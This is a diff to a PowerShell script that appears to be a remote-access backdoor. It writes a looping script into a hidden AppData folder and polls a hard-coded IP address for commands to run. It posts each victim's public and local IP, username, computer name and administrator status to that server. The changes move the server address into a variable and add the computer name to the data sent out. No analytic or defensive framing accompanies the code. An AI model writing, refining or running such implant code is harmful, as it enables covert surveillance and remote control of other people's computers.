@@ -1,11 +1,15 @@
-$verurl = 'http://31.5.63.215/script.txt'
+###parameter values###
+$verurl = 'http://31.5.63.215/script.txt' 
+$url = 'http://31.5.63.215'
 $stop = 'destroy_shell_7$456&89'
-$exec = 0
+######
 
+$exec = 0
 if(!(Test-Path -Path "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r")) {mkdir "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r"}
 $modulename = "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r\psscript.ps1"
-		Write-Output "`$verurl` = 'http://31.5.63.215/script.txt'" > $modulename
-		Write-Output "`$stop` = 'destroy_shell'" >> $modulename
+		Write-Output "`$verurl` = '$verurl'" > $modulename
+		Write-Output "`$stop` = '$stop'" >> $modulename
+		Write-Output "`$url` = '$url'" >> $modulename 
 		Write-Output "`$exec` = 0" >> $modulename
 		Write-Output "while(`$true`) {" >> $modulename
 		Write-Output "	start-sleep -seconds 30" >> $modulename
@@ -29,7 +33,8 @@ $modulename = "$env:USERPROFILE\AppData\Local\Microsoft\hyp3r\psscript.ps1"
 		Write-Output "	`$ip` = (Invoke-WebRequest ifconfig.me/ip).Content" >> $modulename
 		Write-Output "	`$elevated` = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)" >> $modulename
 		Write-Output "	`$localip` = (Get-NetIPConfiguration | Where-Object {`$_`.IPv4DefaultGateway -ne `$null` -and `$_`.NetAdapter.status -ne `"Disconnected`"}).IPv4Address.IPAddress" >> $modulename
-		Write-Output "	Invoke-WebRequest -UseBasicParsing http:\\31.5.63.215 -ContentType `"application/json`" -Method POST -Body `"`$ids` `$ip` `$env:USERNAME` `$elevated` `$localip` `$time` `" | Out-Null " >> $modulename
+		Write-Output "	`$user` = `$env:USERNAME` + `"(`" + `$env:COMPUTERNAME` + `")`"" >> $modulename
+		Write-Output "	Invoke-WebRequest -UseBasicParsing `$url` -ContentType `"application/json`" -Method POST -Body `"`$ids` `$ip` `$user` `$elevated` `$localip` `$time` `" | Out-Null " >> $modulename
 		Write-Output "	if(`$exec` -eq `$filecontent`) {Start-Sleep -Seconds 10; Write-Output `"Command executed. Input another command or set script to standby.`"}" >> $modulename
 		Write-Output "	else {Write-Output `"Standing by.`"}" >> $modulename
 		Write-Output "}" >> $modulename
@@ -84,7 +89,8 @@ while($true) {
 	$ip = (Invoke-WebRequest ifconfig.me/ip).Content
 	$elevated = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 	$localip = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.status -ne "Disconnected"}).IPv4Address.IPAddress
-	Invoke-WebRequest -UseBasicParsing http:\\31.5.63.215 -ContentType "application/json" -Method POST -Body "$ids $ip $env:USERNAME $elevated $localip $time" | Out-Null
+	$user = $env:USERNAME + "(" + $env:COMPUTERNAME + ")"
+	Invoke-WebRequest -UseBasicParsing $url -ContentType "application/json" -Method POST -Body "$ids $ip $user $elevated $localip $time" | Out-Null
 
 	if($exec -eq $filecontent) {Start-Sleep -Seconds 10; Write-Output "Command executed. Input another command or set script to standby."}
 	else {Write-Output "Standing by."}
